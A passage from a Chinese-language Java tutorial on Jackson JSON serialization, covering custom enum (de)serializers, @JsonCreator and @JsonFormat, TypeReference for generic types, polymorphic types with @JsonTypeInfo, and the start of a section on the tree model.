ObjectMapper <span class="title function_">objectMapper</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 通用配置</span></span><br><span class="line">        <span class="comment">// 反序列化时，忽略JSON中存在但Java对象中没有的属性</span></span><br><span class="line">        mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, <span class="literal">false</span>);</span><br><span class="line">        <span class="comment">// 序列化时，不将日期写为时间戳，而是使用ISO-8601格式字符串</span></span><br><span class="line">        mapper.configure(SerializationFeature.WRITE_DATES_AS_TIMESTAMPS, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 注册Java 8时间模块，以支持LocalDate, LocalDateTime等</span></span><br><span class="line">        mapper.registerModule(<span class="keyword">new</span> <span class="title class_">JavaTimeModule</span>());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 创建并注册自定义枚举模块</span></span><br><span class="line">        <span class="type">SimpleModule</span> <span class="variable">enumModule</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleModule</span>(<span class="string">&quot;CustomEnumModule&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">         * 使用一个通用的反序列化器 GenericEnumDeserializer，</span></span><br><span class="line"><span class="comment">         * 通过传入不同的Lambda表达式，为每个枚举提供具体的转换逻辑。</span></span><br><span class="line"><span class="comment">         * 这极大地减少了为每个枚举编写一个独立Deserializer类的样板代码。</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 字符串 -&gt; 枚举</span></span><br><span class="line">        enumModule.addDeserializer(FileTypeEnum.class, <span class="keyword">new</span> <span class="title class_">GenericEnumDeserializer</span>&lt;&gt;(p -&gt; EnumConverter.toFileType(p.getText())));</span><br><span class="line">        enumModule.addDeserializer(PostsEnum.class, <span class="keyword">new</span> <span class="title class_">GenericEnumDeserializer</span>&lt;&gt;(p -&gt; EnumConverter.toPostsType(p.getText())));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 整型 -&gt; 枚举</span></span><br><span class="line">        enumModule.addDeserializer(SubmitStatusEnum.class, <span class="keyword">new</span> <span class="title class_">GenericEnumDeserializer</span>&lt;&gt;(p -&gt; EnumConverter.toFileStatus(p.getIntValue())));</span><br><span class="line">        enumModule.addDeserializer(UserStatusEnum.class, <span class="keyword">new</span> <span class="title class_">GenericEnumDeserializer</span>&lt;&gt;(p -&gt; EnumConverter.toUserStatus(p.getIntValue())));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// ...注册其他所有需要处理的枚举</span></span><br><span class="line"></span><br><span class="line">        mapper.registerModule(enumModule);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> mapper;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通用枚举反序列化器，通过函数式接口解耦具体转换逻辑。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> &lt;T&gt; 目标枚举类型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">GenericEnumDeserializer</span>&lt;T&gt; <span class="keyword">extends</span> <span class="title class_">JsonDeserializer</span>&lt;T&gt; &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Function&lt;JsonParser, T&gt; deserializerFunction;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 修改构造函数，使其更具可读性</span></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">GenericEnumDeserializer</span><span class="params">(Function&lt;JsonParser, T&gt; function)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.deserializerFunction = function;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> T <span class="title function_">deserialize</span><span class="params">(JsonParser p, DeserializationContext ctx)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="comment">// 将实际转换委托给传入的函数</span></span><br><span class="line">            <span class="comment">// 使用try-catch包装，提供更明确的错误信息</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> deserializerFunction.apply(p);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="comment">// 如果转换失败，可以抛出带有上下文信息的异常</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOException</span>(<span class="string">&quot;Failed to deserialize enum from value: &quot;</span> + p.getText(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 定义一个更通用的函数式接口</span></span><br><span class="line">        <span class="meta">@FunctionalInterface</span></span><br><span class="line">        <span class="keyword">interface</span> <span class="title class_">Function</span>&lt;P, R&gt; &#123;</span><br><span class="line">            R <span class="title function_">apply</span><span class="params">(P p)</span> <span class="keyword">throws</span> IOException;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>优点</strong>：<ul>
<li><strong>全局一致性</strong>：确保应用范围内同类型对象的 JSON 格式统一。</li>
<li><strong>集中管理</strong>：所有转换规则在一个地方，易于维护和审查。</li>
<li><strong>DRY (Don’t Repeat Yourself)</strong>：通过泛型和函数式编程，避免为每个枚举创建重复的（反）序列化器类。</li>
</ul>
</li>
<li><strong>缺点</strong>：<ul>
<li><strong>灵活性低</strong>：无法为同一类型的对象在不同场景下定义不同的 JSON 格式。</li>
<li><strong>隐式行为</strong>：转换逻辑与数据模型分离，开发者可能需要查看全局配置才能理解字段的 JSON 行为。</li>
</ul>
</li>
</ul>
<hr>
<h5 id="2-局部注解：通过-JsonSerialize-JsonDeserialize-精细控制"><a href="#2-局部注解：通过-JsonSerialize-JsonDeserialize-精细控制" class="headerlink" title="2.  局部注解：通过 @JsonSerialize &#x2F; @JsonDeserialize 精细控制"></a>2.  局部注解：通过 <code>@JsonSerialize</code> &#x2F; <code>@JsonDeserialize</code> 精细控制</h5><p>当全局规则无法满足特定需求时，可以使用局部注解进行“特例”处理。</p>
<p><strong>核心思想</strong>：<strong>精准控制、逻辑自含</strong>。转换逻辑通过注解与 POJO 字段紧密绑定，使得该字段的 JSON 行为一目了然。</p>
<p><strong>适用场景</strong>：</p>
<ul>
<li>需要将枚举等类型序列化为包含多个字段的<strong>复杂 JSON 对象</strong>。</li>
<li>同一个类型在不同 API 中需要有不同的 JSON 表现形式。</li>
<li>与要求特定、非标准 JSON 格式的第三方系统集成。</li>
</ul>
<p><strong>实现方式</strong>：</p>
<ol>
<li>创建独立的 <code>JsonSerializer&lt;T&gt;</code> 和 <code>JsonDeserializer&lt;T&gt;</code> 实现类。</li>
<li>在 POJO 的字段、Getter&#x2F;Setter 或类上，使用 <code>@JsonSerialize(using = ...)</code> 和 <code>@JsonDeserialize(using = ...)</code> 指定处理器。</li>
</ol>
<p><strong>示例</strong>：将 <code>OrderStatus</code> 枚举与 <code>{&quot;code&quot;: 10, &quot;desc&quot;: &quot;Processing&quot;}</code> 格式进行互转。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 定义枚举（建议增加一个高效的反向查找方法）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">OrderStatus</span> &#123;</span><br><span class="line">    PENDING(<span class="number">0</span>, <span class="string">&quot;Pending Payment&quot;</span>),</span><br><span class="line">    PROCESSING(<span class="number">10</span>, <span class="string">&quot;Processing&quot;</span>);</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String desc;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态Map用于O(1)复杂度的快速查找，代替遍历</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;Integer, OrderStatus&gt; CODE_MAP = Arrays.stream(values())</span><br><span class="line">            .collect(Collectors.toMap(OrderStatus::getCode, e -&gt; e));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> OrderStatus <span class="title function_">fromCode</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">        <span class="type">OrderStatus</span> <span class="variable">status</span> <span class="operator">=</span> CODE_MAP.get(code);</span><br><span class="line">        <span class="keyword">if</span> (status == <span class="literal">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid code: &quot;</span> + code);</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Constructor, Getters...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 自定义序列化器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderStatusSerializer</span> <span class="keyword">extends</span> <span class="title class_">JsonSerializer</span>&lt;OrderStatus&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(OrderStatus value, JsonGenerator gen, SerializerProvider serializers)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        gen.writeStartObject();</span><br><span class="line">        gen.writeNumberField(<span class="string">&quot;code&quot;</span>, value.getCode());</span><br><span class="line">        gen.writeStringField(<span class="string">&quot;desc&quot;</span>, value.getDesc());</span><br><span class="line">        gen.writeEndObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 自定义反序列化器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">OrderStatusDeserializer</span> <span class="keyword">extends</span> <span class="title class_">JsonDeserializer</span>&lt;OrderStatus&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> OrderStatus <span class="title function_">deserialize</span><span class="params">(JsonParser p, DeserializationContext ctxt)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">JsonNode</span> <span class="variable">node</span> <span class="operator">=</span> p.getCodec().readTree(p);</span><br><span class="line">        <span class="type">int</span> <span class="variable">code</span> <span class="operator">=</span> node.get(<span class="string">&quot;code&quot;</span>).asInt();</span><br><span class="line">        <span class="keyword">return</span> OrderStatus.fromCode(code); <span class="comment">// 使用高效查找</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 在POJO中使用</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Order</span> &#123;</span><br><span class="line">    <span class="meta">@JsonSerialize(using = OrderStatusSerializer.class)</span></span><br><span class="line">    <span class="meta">@JsonDeserialize(using = OrderStatusDeserializer.class)</span></span><br><span class="line">    <span class="keyword">private</span> OrderStatus status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然自定义 <code>Serializer/Deserializer</code> 功能最强，但代码也最繁琐。Jackson 提供了更简洁的注解来实现类似功能。</p>
<p><strong>优化1：高效反序列化</strong></p>
<p>在枚举增加一个静态 <code>Map</code> 来缓存 <code>code</code> 和枚举实例的对应关系，将反序列化时的查找复杂度从 <code>O(N)</code> 降为 <code>O(1)</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">OrderStatus</span> &#123;</span><br><span class="line">    <span class="comment">// ... 枚举实例</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String desc;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 静态Map用于快速查找</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Map&lt;Integer, OrderStatus&gt; CODE_MAP = Stream.of(values())</span><br><span class="line">            .collect(Collectors.toMap(OrderStatus::getCode, e -&gt; e));</span><br><span class="line"></span><br><span class="line">    OrderStatus(<span class="type">int</span> code, String desc) &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> OrderStatus <span class="title function_">fromCode</span><span class="params">(<span class="type">int</span> code)</span> &#123;</span><br><span class="line">        <span class="type">OrderStatus</span> <span class="variable">status</span> <span class="operator">=</span> CODE_MAP.get(code);</span><br><span class="line">        <span class="keyword">if</span> (status == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid OrderStatus code: &quot;</span> + code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> status;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// getters...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>替代方案1：使用 <code>@JsonFormat</code> 序列化为对象</strong></p>
<p>如果你的目标只是想把一个对象（包括枚举）的所有公共 Getter 方法序列化成一个 JSON 对象，使用 <code>@JsonFormat</code> 是最简单的方式，<strong>无需编写 <code>OrderStatusSerializer</code></strong>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonFormat;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在枚举类上添加注解</span></span><br><span class="line"><span class="meta">@JsonFormat(shape = JsonFormat.Shape.OBJECT)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">OrderStatus</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// 需要确保有public的getter方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getCode</span><span class="params">()</span> &#123; <span class="keyword">return</span> code; &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDesc</span><span class="params">()</span> &#123; <span class="keyword">return</span> desc; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// POJO中只需一个注解即可</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Order</span> &#123;</span><br><span class="line">    <span class="comment">// @JsonSerialize注解可以移除了！</span></span><br><span class="line">    <span class="meta">@JsonDeserialize(using = OrderStatusDeserializer.class)</span> <span class="comment">// 反序列化仍需自定义</span></span><br><span class="line">    <span class="keyword">private</span> OrderStatus status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>替代方案2：使用 <code>@JsonCreator</code> 进行反序列化</strong></p>
<p><code>@JsonCreator</code> 标记一个构造函数或静态工厂方法，用于从 JSON 创建对象。这可以<strong>替代 <code>OrderStatusDeserializer</code></strong>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">OrderStatus</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用静态工厂方法和@JsonCreator</span></span><br><span class="line">    <span class="meta">@JsonCreator</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> OrderStatus <span class="title function_">fromCode</span><span class="params">(<span class="meta">@JsonProperty(&quot;code&quot;)</span> <span class="type">int</span> code)</span> &#123;</span><br><span class="line">        <span class="comment">// 复用优化过的查找逻辑</span></span><br><span class="line">        <span class="keyword">return</span> Stream.of(values())</span><br><span class="line">                .filter(s -&gt; s.getCode() == code)</span><br><span class="line">                .findFirst()</span><br><span class="line">                .orElseThrow(() -&gt; <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid code: &quot;</span> + code));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// ... getters and other code</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// POJO中注解再次简化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Order</span> &#123;</span><br><span class="line">    <span class="meta">@JsonSerialize(using = OrderStatusSerializer.class)</span> <span class="comment">// 或者使用@JsonFormat</span></span><br><span class="line">    <span class="comment">// @JsonDeserialize注解可以移除了！</span></span><br><span class="line">    <span class="keyword">private</span> OrderStatus status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>组合拳</strong>：<code>@JsonFormat(shape = Shape.OBJECT)</code> + <code>@JsonCreator</code> 是处理枚举与JSON对象互转的<strong>最佳实践</strong>，完全无需编写独立的（反）序列化器类。</p>
</blockquote>
<ul>
<li><strong>优点</strong>：<ul>
<li><strong>极高灵活性</strong>：可以为每个字段都指定不同的（反）序列化策略。</li>
<li><strong>逻辑自包含</strong>：转换逻辑与数据模型绑定，代码可读性强，易于理解。</li>
</ul>
</li>
<li><strong>缺点</strong>：<ul>
<li><strong>代码冗余</strong>：可能需要编写大量独立的 <code>(De)Serializer</code> 类，样板代码多。</li>
<li><strong>管理分散</strong>：逻辑分散在各个 POJO 中，难以进行统一的规则修改。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="3-3-2-处理泛型"><a href="#3-3-2-处理泛型" class="headerlink" title="3.3.2 处理泛型"></a>3.3.2 处理泛型</h4><p><strong>场景</strong>：反序列化一个包含泛型类型的复杂对象，如<code>ApiResponse&lt;User&gt;</code>或<code>List&lt;User&gt;</code>。</p>
<p><strong>问题</strong>：由于Java的类型擦除，在运行时<code>List&lt;User&gt;</code>的类型信息只剩下<code>List</code>。直接使用<code>mapper.readValue(json, List.class)</code>会得到一个<code>List&lt;LinkedHashMap&gt;</code>，在后续使用中会抛出<code>ClassCastException</code>。</p>
<p><strong>解决方案</strong>：使用 <code>TypeReference</code>。它是一个抽象类，通过创建一个它的匿名子类，可以捕获并保留完整的泛型类型信息。</p>
<p><strong>示例</strong>：反序列化一个通用的API响应对象 <code>ApiResponse&lt;T&gt;</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 定义一个泛型包装类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ApiResponse</span>&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">    <span class="keyword">private</span> T data;</span><br><span class="line">    <span class="comment">// Getters and Setters...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 准备JSON字符串</span></span><br><span class="line"><span class="type">String</span> <span class="variable">jsonResponse</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;code\&quot;:200,\&quot;message\&quot;:\&quot;Success\&quot;,\&quot;data\&quot;:&#123;\&quot;id\&quot;:101,\&quot;name\&quot;:\&quot;SuperUser\&quot;&#125;&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 使用TypeReference进行反序列化</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    TypeReference&lt;ApiResponse&lt;User&gt;&gt; typeRef = <span class="keyword">new</span> <span class="title class_">TypeReference</span>&lt;ApiResponse&lt;User&gt;&gt;() &#123;&#125;;</span><br><span class="line">    ApiResponse&lt;User&gt; apiResponse = mapper.readValue(jsonResponse, typeRef);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 此时data字段被正确地反序列化为User类型</span></span><br><span class="line">    <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> apiResponse.getData();</span><br><span class="line">    System.out.println(user.getName()); <span class="comment">// 输出: SuperUser</span></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (JsonProcessingException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>最佳实践</strong>：任何时候反序列化泛型集合或泛型类，<strong>始终使用 <code>TypeReference</code></strong>。</p>
<hr>
<h4 id="3-3-3-处理多态类型（Polymorphic-Deserialization）"><a href="#3-3-3-处理多态类型（Polymorphic-Deserialization）" class="headerlink" title="3.3.3 处理多态类型（Polymorphic Deserialization）"></a>3.3.3 处理多态类型（Polymorphic Deserialization）</h4><p><strong>场景</strong>：一个JSON字段或数组元素可能是多种不同子类的实例。例如，一个<code>List&lt;Shape&gt;</code>中可能同时包含<code>Circle</code>和<code>Square</code>对象。</p>
<p><strong>问题</strong>：在反序列化时，Jackson如何知道JSON对象 <code>{ &quot;radius&quot;: 10.0 }</code> 应该被创建为<code>Circle</code>对象，而 <code>{ &quot;side&quot;: 5.0 }</code> 应该被创建为<code>Square</code>对象？</p>
<p><strong>解决方案</strong>：在序列化时向JSON中添加额外的类型信息，反序列化时根据此信息创建正确的子类实例。这通过<code>@JsonTypeInfo</code>和<code>@JsonSubTypes</code>注解实现。</p>
<p><strong>示例</strong>：处理<code>Shape</code>接口及其实现类<code>Circle</code>和<code>Square</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 定义基类/接口，并添加注解</span></span><br><span class="line"><span class="meta">@JsonTypeInfo(</span></span><br><span class="line"><span class="meta">    use = JsonTypeInfo.Id.NAME, </span></span><br><span class="line"><span class="meta">    include = JsonTypeInfo.As.PROPERTY, </span></span><br><span class="line"><span class="meta">    property = &quot;@type&quot; // 这个属性名可以自定义</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="meta">@JsonSubTypes(&#123;</span></span><br><span class="line"><span class="meta">    @JsonSubTypes.Type(value = Circle.class, name = &quot;circle&quot;),</span></span><br><span class="line"><span class="meta">    @JsonSubTypes.Type(value = Square.class, name = &quot;square&quot;)</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 定义子类</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Circle</span> <span class="keyword">extends</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> radius;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Square</span> <span class="keyword">extends</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> side;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 使用</span></span><br><span class="line">List&lt;Shape&gt; shapes = Arrays.asList(<span class="keyword">new</span> <span class="title class_">Circle</span>(<span class="number">10.0</span>), <span class="keyword">new</span> <span class="title class_">Square</span>(<span class="number">5.0</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化</span></span><br><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(shapes);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 输出的JSON会自动包含@type字段:</span></span><br><span class="line"><span class="comment"> * [</span></span><br><span class="line"><span class="comment"> *   &#123;&quot;@type&quot;:&quot;circle&quot;,&quot;radius&quot;:10.0&#125;,</span></span><br><span class="line"><span class="comment"> *   &#123;&quot;@type&quot;:&quot;square&quot;,&quot;side&quot;:5.0&#125;</span></span><br><span class="line"><span class="comment"> * ]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 反序列化</span></span><br><span class="line">List&lt;Shape&gt; deserializedShapes = mapper.readValue(json, <span class="keyword">new</span> <span class="title class_">TypeReference</span>&lt;List&lt;Shape&gt;&gt;() &#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 验证结果</span></span><br><span class="line"><span class="comment">// deserializedShapes.get(0) 是一个Circle实例</span></span><br><span class="line"><span class="comment">// deserializedShapes.get(1) 是一个Square实例</span></span><br></pre></td></tr></table></figure>

<hr>
<h4 id="3-3-4-使用树模型（Tree-Model）动态解析-生成JSON"><a href="#3-3-4-使用树模型（Tree-Model）动态解析-生成JSON" class="headerlink" title="3.3.4 使用树模型（Tree Model）动态解析&#x2F;生成JSON"></a>3.3.4 使用树模型（Tree Model）动态解析&#x2F;生成JSON</h4><p><strong>场景</strong>：</p>
<ul>
<li>JSON结构不固定或完全未知。</li>
<li>你只需要读取或修改一个巨大JSON文档中的一小部分数据，无需创建完整的POJO。</li>
<li>需要动态地构建一个JSON对象。</li>
</ul>
<p><strong>实现方式</strong>：使用<code>JsonNode</code>及其子类（<code>ObjectNode</code>, <code>ArrayNode</code>）。<code>JsonNode</code>是<strong>不可变</strong>的，适合读取；<code>ObjectNode</code>&#x2F;<code>ArrayNode</code>是<strong>可变</strong>的，适合构建或修改。</p>
<p><strong>示例1：动态解析</strong></p>
